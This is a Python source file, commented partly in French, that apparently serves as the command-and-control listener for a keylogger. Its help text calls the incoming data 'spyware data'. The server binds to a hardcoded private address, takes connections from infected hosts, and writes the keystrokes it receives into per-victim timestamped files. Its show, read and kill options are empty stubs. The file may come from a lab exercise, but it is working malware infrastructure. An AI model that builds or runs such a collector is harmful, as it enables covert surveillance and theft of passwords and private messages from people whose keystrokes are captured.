import socket
import datetime
import argparse
import time
import sys
import os
from pathlib import Path
from threading import Thread



# Arguments 

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()
group.add_argument("-l", "--listen", type=int, help="listens on the TCP port entered by the user and waits for the spyware data.")
group.add_argument("-s", "--show", help="displays the list of files received by the program.", action="store_true")
group.add_argument("-r", "--readfile", type=str, help="displays the content of a keylog file.")
group.add_argument("-k", "--kill", help="stop all the instances of the server and stop all the clients.", action="store_true")
args = parser.parse_args()



# Fonctions

def handle_client(conn, addr):
    print(f"Connection from {addr}")

    listen = True

    while listen:
        try:
            # Réception des données
            data = conn.recv(1024).decode('utf-8')

            if data:

                cwd = Path.cwd()
                fic = list(cwd.glob(f"{addr[0]}*.txt"))
                filename = f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
                
                if fic == []:
                    with open(filename, 'w') as file:
                        file.write(data)
                else:
                    ficfilename = fic[0]
                    with open(ficfilename, 'a') as file:
                        file.write("\n")
                        file.write(data)
                    os.rename(ficfilename,filename)

                print(f"Data received and saved in {filename}")
            
        # except KeyboardInterrupt:
        #     listen = False
        #     conn.close()

        #     print(f"Connection closed with {addr}")

        except Exception as e:
            listen = False
            print(f"Error: {e}")






# Traitement

if args.listen:
    # Configuration du socket
    host = '172.16.120.1'
    port = args.listen

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen()

    print(f"Server listening on {host}:{port}")


    running = True

    threads = []

    while running:

        conn, addr = server_socket.accept()

        thread = Thread(target=handle_client, args=(conn, addr))

        thread.start()

        threads.append(thread)




elif args.show:
    print("display all the files")



elif args.readfile:
    print("read a file")



elif args.kill:
    print("kill all the instances")



